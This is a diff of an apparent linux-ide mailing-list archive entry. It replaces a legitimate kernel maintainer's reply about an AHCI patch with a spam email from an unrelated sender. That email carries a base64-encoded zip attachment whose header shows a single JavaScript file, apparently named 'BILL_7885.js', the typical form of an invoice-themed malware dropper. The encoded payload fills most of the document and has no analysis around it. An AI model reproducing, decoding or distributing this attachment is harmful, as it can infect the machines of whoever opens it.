@@ -1,38 +1,119 @@
-From: Tejun Heo <tj@kernel.org>
-Subject: Re: [PATCH] ahci: fix the single MSI-X case in ahci_init_one
-Date: Tue, 25 Oct 2016 11:43:56 -0400
-Message-ID: <20161025154356.GA7026@htj.duckdns.org>
-References: <1477397074-26799-1-git-send-email-hch@lst.de>
+From: <mariobronti@gmail.com>
+Subject: (unknown)
+Date: Tue, 25 Oct 2016 17:17:19 -0000
+Message-ID: <147741583963.13761.9481408113150913508@une.net.co>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
+Content-Type: application/zip; name="EMAIL_26515359826_linux-ide.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-ide-owner@vger.kernel.org>
-Received: from mail-yb0-f177.google.com ([209.85.213.177]:37061 "EHLO
-        mail-yb0-f177.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S932183AbcJYPn7 (ORCPT
-        <rfc822;linux-ide@vger.kernel.org>); Tue, 25 Oct 2016 11:43:59 -0400
-Received: by mail-yb0-f177.google.com with SMTP id 205so793986ybg.4
-        for <linux-ide@vger.kernel.org>; Tue, 25 Oct 2016 08:43:58 -0700 (PDT)
-Content-Disposition: inline
-In-Reply-To: <1477397074-26799-1-git-send-email-hch@lst.de>
+Received: from pei-201-236-ccxxiii-xlvii.une.net.co ([201.236.223.47]:34648
+        "HELO une.net.co" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S1753069AbcJYRRZ (ORCPT
+        <rfc822;linux-ide@vger.kernel.org>); Tue, 25 Oct 2016 13:17:25 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: linux-ide-owner@vger.kernel.org
 List-Id: linux-ide@vger.kernel.org
-To: Christoph Hellwig <hch@lst.de>
-Cc: linux-ide@vger.kernel.org, rrichter@cavium.com, ddaney.cavm@gmail.com
+To: linux-ide@vger.kernel.org
 
-On Tue, Oct 25, 2016 at 02:04:34PM +0200, Christoph Hellwig wrote:
-> We need to make sure hpriv->irq is set properly if we don't use per-port
-> vectors, so switch from blindly assigning pdev->irq to using
-> pci_irq_vector, which handles all interrupt types correctly.
-> 
-> Signed-off-by: Christoph Hellwig <hch@lst.de>
-> Reported-by: Robert Richter <robert.richter@cavium.com>
-> Tested-by: Robert Richter <robert.richter@cavium.com>
-> Tested-by: David Daney <ddaney.cavm@gmail.com>
-> Fixes: 0b9e2988ab22 ("ahci: use pci_alloc_irq_vectors")
-
-Applied to libata/for-4.9-fixes.
-
-Thanks.
-
--- 
-tejun
+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
